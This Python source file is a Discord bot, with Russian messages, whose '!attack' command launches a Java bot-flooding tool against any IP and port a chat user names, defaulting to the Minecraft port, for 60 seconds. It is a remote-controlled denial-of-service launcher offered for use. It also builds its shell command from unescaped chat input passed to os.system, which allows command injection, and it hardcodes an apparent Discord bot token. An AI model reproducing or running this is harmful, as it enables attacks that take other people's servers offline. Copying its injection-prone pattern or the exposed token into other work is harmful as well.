import discord
from discord.ext import commands
import threading
import asyncio
import os

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.messages = True

token = "MTIxODU2NDEzNTk0NDU4OTMzMg.G_U9zf.9NKc6IK7L640hXX1FqxJv1ssYrMAAd1Ya_xwB0"

client = commands.Bot(command_prefix='!', intents=intents)

@client.event
async def on_ready():
    print("Бот готов")

@client.command()
async def ready(ctx):
    await ctx.send("Бот работает")

@client.command()
async def attack(ctx, ip="localhost", protocol="25565", method="botjoiner"):
    time = "60"
    netty_threads = "3"
    loop_threads = "1"
    yn = "y"

    command = ["java", "-jar", "bot1.jar", ip, protocol, method, time, netty_threads, loop_threads, yn]

    def launch_attack():
        asyncio.run_coroutine_threadsafe(attack_started(ctx), client.loop)
        os.system(" ".join(command))
        asyncio.run_coroutine_threadsafe(attack_complete(ctx), client.loop)

    t1 = threading.Thread(target=launch_attack)
    t1.start()

async def attack_started(ctx):
    await ctx.send("Атака начата.")

async def attack_complete(ctx):
    await ctx.send("Атака завершена.")

client.run(token)
